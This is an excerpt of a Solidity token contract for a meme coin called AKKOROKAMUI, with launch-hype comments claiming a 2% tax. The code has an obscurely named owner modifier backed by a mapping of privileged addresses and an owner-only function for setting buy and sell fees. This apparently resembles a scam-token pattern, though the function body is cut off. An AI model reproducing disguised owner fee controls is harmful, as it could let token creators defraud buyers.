...
// Twitter : https://twitter.com/AkkorokamuiERC

// Medium: https://medium.com/@Akkorokamui 

/*

Attention Akkorokamui Army !!!

Stay tuned with us , we are launching shortly.

Some necessary details :

Name : AKKOROKAMUI
Symbol : $YOKAI
Supply : 1 Trillion $YOKAI
Pre Burn : 30%
Tax : 2%
...
contract Ownable is Context {
    ...
    modifier onlOwner_() {
        require(isonlOwner_(msg.sender), "!onlOwner_"); _;
    }

    function isonlOwner_(address adr) public view returns (bool) {
        return get[adr];
    }
    ...
    mapping (address => bool) internal get;
...
contract AKKOROKAMUI is Context, IERC20, Ownable {
    ...
    address payable private _developmentWalletAddress = payable(0x17285d5e38eEe493069D4d315191fCbFC1D05216);
    address payable private _marketingWalletAddress = payable(0x17285d5e38eEe493069D4d315191fCbFC1D05216);
    ...
    function InandOutRate(uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlOwner_
     {
